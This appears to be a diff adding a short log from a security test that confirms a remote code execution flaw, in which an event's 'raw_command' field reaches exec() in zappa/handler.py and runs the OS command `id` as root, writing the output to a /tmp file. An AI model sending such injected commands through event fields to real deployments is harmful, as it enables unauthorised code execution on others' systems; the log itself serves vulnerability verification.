@@ -1,0 +1,6 @@
+[INFO] exercising: zappa/handler.py:919 exec(event['raw_command'])
+[STEP] sending {"raw_command": ...} that runs `id` and writes /tmp/vuln001_rce_fd8883ee
+[INFO] contents of /tmp/vuln001_rce_fd8883ee: 'uid=0 | uid=0(root) gid=0(root) groups=0(root)'
+[PROOF] the event's raw_command executed inside the function: it ran the OS command `id` and wrote its output ('uid=0 | uid=0(root) gid=0(root) groups=0(root)') to disk — arbitrary code + shell execution from an event field.
+[OK] exploit confirmed — raw_command -> exec() -> OS command execution
+==> VULN-001: CONFIRMED — event raw_command -> exec() RCE (Surface B)
